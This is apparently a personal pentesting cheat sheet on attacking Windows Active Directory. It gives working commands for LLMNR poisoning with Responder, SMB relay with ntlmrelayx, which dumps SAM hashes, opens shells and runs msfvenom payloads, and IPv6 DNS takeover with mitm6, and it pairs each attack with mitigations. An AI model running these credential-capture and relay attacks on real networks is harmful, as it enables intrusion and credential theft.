# Windows Active Directory
## //cheat-sheet

**[Back to Command-Center](https://github.com/codetorok/command-center/blob/master/README.md)**


### What is AD?

* Directory service developed by Microsoft Windows to manage Windows domain networks.

#### What does it do?

* Stores information related to objects, such as Computers, Users, Printers, etc.

#### How does it work?

* Authenticates using Kerberos tickets.
* **Non-Windows** devices, such as Linux machines, firewalls, etc. can also authenticate to Active Directory via RADIUS or LDAP.
* **LDAP = Lightweight Directory Access Protocol**

#### Why to learn AD?

* AD is the most commonly used identity management system in the world!
* **It can be exploited without ever attacking patchable exploits. Instead abuse features, trusts, components and more.

### Components:

#### Domain Controllers:

* hosts a copy of the AD DS (directory store - data store)
* provides authentication and authroization services
* replicates updates to other domain controllers in the domain and forest
* allows administrative access to manage user accounts and network resources

#### AD DS Data Store

* consits of the Ntds.dit file
* which is stored by default in the %SystemRoot%\NTDS folder on all domain controllers
* is only accessible through the domain controller processes and protocols

## Initial Attack Vectors

* first we have to find a way in to the network
* how to abuse features of Windows
* support article: **[Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition)](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)**

#### LLMNR poisoning

* **LINK LOCAL MULTICAST NAME RESOLUTION**
* used to identify hosts when DNS fails to do so
* previously ***NBT-NS***
* **key flaw is** that the the service utilize a user's username and  NTLMv2 hash when approprietly responded to
* when we respond to this service it responds back to us with a username and a NTLMv2 password hash
* user types in something misspelled, server send us a broadcast message, we listen ***man in the middle*** attack, we respond yes and capture the username and hash then forward the request to the server. **responder** will help us with that, which is a tool from **Impacket**
* run **responder** first thing in the morning or when people come back from lunch because it needs some traffic

##### Responder:

* `python Responder.py -I tun0 -rdwv`
* **-I** is for interface
* **-rdwv** is the different types we're listening on, ***-w*** is for wpad
* ***-v*** is for verbose to see the hash more than once if it happens
* look at the ***--help*** for more info


### LLMNR poisoning Defenses

* the best defense is to disable LLMNR and NBT-NS
* if that's not possible tell them to enable Network Access Control (it's going to look for a specific MAC address and if it's not allowed then it will shut it down, the port. There are methods to bypass that too but that's another subject.)
* long and strong passwords, longer than 14 characters, mixed case characters and symbols, numbers

### SMB Relay Attack

#### Requierements

* SMB signing has to be disabled on the target
* relayed user credentials must be an admin on machine

#### Use Responder to capture and ntlmrelayx to relay

* in Responder HTTP and SMB server must be off so we can relay the request instead of responding to it
* configrue ***ntlmrelayx*** like this: `python ntlmrelayx.py -tf targets.txt -smb2support`
* all this does is identifying, it takes the relay and takes it to the target.txt file and smb2support tells it where to relay it to
* if SMB signing if off or it's on but ***not required*** and user is an admin on the relayed machine **ntlmrelayx.py will dump the SAM hashes**

#### Discover if SMB signing is disabled

* can search for a tool on github
* or with nmap: `nmap --script=smb2-security-mode.nse -p 445 IP/24`

#### If trying to get an interactive shell with ntlmrelayx

* append ***-i*** to `ntlmrelayx.py -tf targets.txt -smb2support -i
* ***-tf*** stands for ***target file***
* when running interactive see in feeds where an whic port is the one where ntlmrelayx created the interactive shell, I'll use port 11000 as an example here
* then on another tab in tty open up: `nc 127.0.0.1 11000`
* we are in an SMB shell essentially, type in `help` for available commands
* we can do many thing here, we can look at the shares, change password of current user, moving files, directories, create a mount point, upload file, etc.
* `shares` shows the available shares, then `use C$` once in, list it out `ls` and we've got access to the C: drive
* similary we can ls out the admin folder as well

#### Additionally with ntlmrelayx.py

* we can generate a payload with ***msfvenom*** like ***payload.exe*** as an example and execute it on the target machine and then set up a meterpreter listener in ***metasploit*** and get a shell on the target machine
* `ntlmrelayx.py -tf targets.txt -smb2support -e payload.exe
* or we can execute commands with the ***-c*** option
* it can be from somehting simple as `ntlmrelayx.py -tf targets.txt -c "whoami"` to a more complex reverse shell or powershell command

#### Mitigation strategies

* **ENABLE SMB SINGIN ON ALL DEVICES**
* **PRO:** completely stops the attack
* **CON:** can cause performance issues with file copies
* **DISABLE NTLM AUTHENTICATION ON NETWORK**
* **PRO:** completely stops the attack
* **CON:** if Kerberos stops working, Windows defaults back to NTLM
* **ACCOUNT TIERING**
* **PRO:** limits domain admins to specific tasks
* **CON:** enforcing the policy may be difficult
* **LOCAL ADMIN RESTRICTIONS**
* **PRO:** can prevent a lot of lateral movement
* **CON:** potential increase in the amount of service desk tickets

### IPv6 attacks

#### DNS takeover attacks via IPv6

* who's doing IPv6 DNS...? usually nobody!

#### Installing mitm6

* from github clone **[mitm6](https://github.com/fox-it/mitm6)**
* cd into your new folder: `pip3 install .` will install the requirements for us

#### Attack:

* start mitm6: `mitm6 -d domain.local` let it run
* we also need to setup a relay attack: `netlmrelayx.py -6 -t ldaps://<domain contorller's IP> -wh fakewpad.domaincontoller.local -l lootme`
* **-6** is for IPv6 IPs, **ladps** attack via LDAP Securte, **-l** for loot, create a loot file used to store information mitm6 dumps out on target
* IPv6 is sending out: who's got my DNS? it sends it out in about every 30 minutes, mitm6 is trying to relay credentials and dump out everything it can into the ***lootme*** file we set up for it

* when an admin logs in, mitm6 tries to relay the DNS through IPv6 targeting ldap and creates a new user for us
* outdside the created ***loot*** there's a file something like ***aclpwn-date.restore*** that restores everything as it was before the attack
* additional resource through these articles: **[The best of both worlds](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)** and **[Compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)**

#### Mitigation:

* IPv6 poisoning absuses the fact that Windows queries for IPv6 addresses even on an IPv4-only environments.
* If you don't use IPv6 the safest way is to block DHCPv6 traffic.
* If wpad is not in use, disable it.
* Relaying LDAP and LDAPS can only be mitigated by enabling both LDAP singing and channel binding.
* Consider Administrative users to Protected users group or marking them as ***Account is sensitive*** and can not be delegated, which will prevent any impersonation of that user via delegation.

### Strategies

* begin the day with man in the middle attack or repsonder (***mitm6*** or ***Responder.py***)
* run scans to generate traffic
* if scans are taking too long, look for websites in scope (http_version)
* look for default credentials on web logins (Printers, Jenkins, etc.)
* **think outside the box**

## Post compromise enumeration

#### Domain enumeration with PowerView

* starting from 18/120
